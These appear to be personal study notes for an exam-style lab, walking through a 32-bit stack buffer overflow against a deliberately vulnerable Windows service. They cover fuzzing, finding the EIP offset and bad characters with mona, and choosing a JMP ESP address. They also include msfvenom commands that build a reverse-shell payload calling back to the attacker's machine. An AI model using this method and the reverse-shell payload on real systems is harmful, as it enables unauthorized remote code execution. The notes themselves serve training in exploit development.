# Setup and Fuzz
1. Run immunity debugger as admin
2. REPEAT STEP set mona working directory - DO THIS ON EVERY STAGE (ALSO CHANGE IPS IN .py SCRIPTS)
> !mona config -set workingfolder c:\mona\%p
3. Create a file called Fuzz.py, this file can be used to scope out the program where to crash it i.e ussually containing contents such as the following: 
> ![[Pasted image 20211122121536.png]]
4. Fuzz the target and note how many bytes it crashed at.
5. Run the following command IN LINUX TERMINAL and make the -l value 400 greater than the value the program crashed at 
> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l *400+ value*
# Exploit.py 
7. Create another file called exploit.py with the following contents but put your payload from the above command in the "payload" section:
> ![[Pasted image 20211122134236.png]]
8. Re-open and run the program on the windows machine again because we crashed it earlier.
9. Run exploit.py, this should crash the server again
10. This time, in immunity debugger enter the following command with the +400 value:
> !mona findmsp -distance *400+value*
# Exploit.py mod 2
11. update exploit.py script and set the offset variable (previously 0) to the EIP variable here:
> ![[Pasted image 20211122144719.png]]
12. also change the retn varialbe to "BBBB"
> ![[Pasted image 20211122153010.png]]
13. Restart program and launch exploit2 add mona to current working dir, the EIP register should now be 42424242 (4 B's)
> ![[Pasted image 20211122155224.png]]
# Bad Chars from exploit.py 2
14. Ensure the file dir is set again and run the following command once exploit2 has ran in mona:
> !mona bytearray -b "\x00"
15. Note the output location of the bytearray.bin file after it's ran:
> ![[Pasted image 20211122155953.png]]
16. Run badchars.py so we can copy and paste from terminal into our payload variable
# Exploit.py mod 3 - bad chars
17. add the chars into payload, and run the program and exploit.py again:
> ![[Pasted image 20211122164611.png]]
20. Make note of the ESP address after its crashed the program  :
> ![[Pasted image 20211122164722.png]]
21. Use mona command to retrieve bad chards:
> !mona compare -f C:\mona\oscp\bytearray.bin -a "ESP"
22. Bad chars will then be displayed in "memory corruption results"
> ![[Pasted image 20211122164901.png]]
23. Remove these chars in order one by one from the exploit script, Copying the ESP address into the compare command each time you run the program.
> !mona compare -f C:\mona\oscp\bytearray.bin -a *CHANGE ESP EVERYTIME CHAR REMOVED*
25. Once you've removed the minimum amount of chars i.e one can poison the following and when what you've removed matches the window, run the bytearray command with the bad chars in:
> !mona bytearray -b "*insert final bad chars \x00\x01 etc.*"
26. Run the program again with the final bye-array specified with them bad chars removed, use the compare command with the new ESP address and if it's done correctly an "unmodified" message should appear.
> ![[Pasted image 20211123125742.png]]

"\x00\x07\x2e\xa0"

# Jump ESP address

27. Once the modified message has appeared we can run the following command when it's in a crashed state to find jmp esp:
> !mona jmp -r esp -cpb "badchars"
28. You will be presented with a list of jmp esp addresses, any should work but we're looking for as many "false" values as possible, if something is "true" it may not work 
> ![[Pasted image 20211123130636.png]]
29. Copy the address you wish to use, write is as a note next to the "retn" address in the exploit file as we have to backwards the syntax
> > copy address > reverse address DONT FORGET BACKSLASHES
>![[Pasted image 20211123162518.png]]

# Generate msfvenom payload

30. Run the following command and change the -b argument to all the bad chars we used:
i.e: 
> msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
> msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
31. copy the quote to quote but leave out the semi colon and add brackets around the bytes into the payload variable:
> ![[Pasted image 20211123131857.png]]
32. Since an encoder was likely used to generate payload ensure we have some extra spare in memory by setting a padding value of 16 or more:
> ![[Pasted image 20211123132113.png]]
33. Listen on port 4444/port specified & run the exploit with the program runing to catch a shell :Dwhoam

DONT LEAVE PADDING IN


victim machine > on the netowork youre on > vuln 32bit bynary running on a port.
